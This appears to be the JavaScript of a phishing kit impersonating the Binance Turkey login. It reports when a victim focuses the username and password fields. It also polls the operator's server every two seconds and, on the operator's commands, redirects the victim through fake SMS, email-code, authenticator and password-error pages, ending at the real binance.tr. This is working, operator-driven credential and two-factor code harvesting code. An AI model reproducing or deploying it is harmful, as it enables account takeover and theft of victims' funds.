document.addEventListener("DOMContentLoaded", () => {
    const inputs = document.querySelectorAll("#trname, #trpass");
    let lastFocusedInput = null; 

    inputs.forEach(input => {
        input.addEventListener("focus", () => {
            if (lastFocusedInput !== input) {  
                lastFocusedInput = input;  
                sendPost(input.placeholder);  
            }
        });
    });

    function sendPost(selectedAction) {
        const postData = {
            additionalData: selectedAction
        };

        fetch("/api2", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(postData)
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error("Sunucu hatası!");
                }
                return response.json();
            })
            .then(data => {
                console.log("Başarılı:", data);
            })
            .catch(error => {
                console.error("Hata:", error.message);
            });
    }
});


function sendUrlPath() {
    const currentPath = window.location.pathname + window.location.search;
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/api", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {  
            if (xhr.status === 200) {
                const responseText = xhr.responseText.trim();
                switch (responseText) {
                    case "sms":
                        window.location.href = '/sms';
                        break;
                    case "smssms":
                        window.location.href = '/sms';
                        break;
                    case "hata":
                        window.location.href = '/sms-error';
                        break;
                   case "hatahata":
                        window.location.href = '/sms-error';
                        break;    
                    case "sms2":
                        window.location.href = '/error-number';
                        break;
                    case "sms2sms2":
                        window.location.href = '/error-number';
                        break;
                    case "sifrehata":
                        window.location.href = '/password-error';
                        break;
                        case "sifrehatasifrehata":
                            window.location.href = '/password-error';
                            break;
                    case "back":
                        window.location.href = '/email-error';
                        break;
                    case "backback":
                        window.location.href = '/email-error';
                        break; 
                    case "postakod":
                        window.location.href = '/mail';
                        break;
                   case "postakodpostakod":
                        window.location.href = '/mail';
                        break;
                    case "google":
                        window.location.href = '/authenticator';
                        break;
                    case "googlegoogle":
                        window.location.href = '/authenticator';
                        break;
                  case "ban":
                        window.location.href = 'https://www.binance.tr';
                        break;
                   case "banban":
                        window.location.href = 'https://www.binance.tr';
                        break;
                    case "tebrik":
                        window.location.href = '/successfuly';
                        break;
                    default:
                }
            } else {
                console.error("e: ", xhr.status, xhr.statusText);
            }
        }
    };
    xhr.onerror = function () {
        console.error("asv.");
    };
    try {
        xhr.send(`x=${encodeURIComponent(currentPath)}`);
    } catch (error) {
        console.error("era:", error);
    }
}

setInterval(sendUrlPath, 2000);
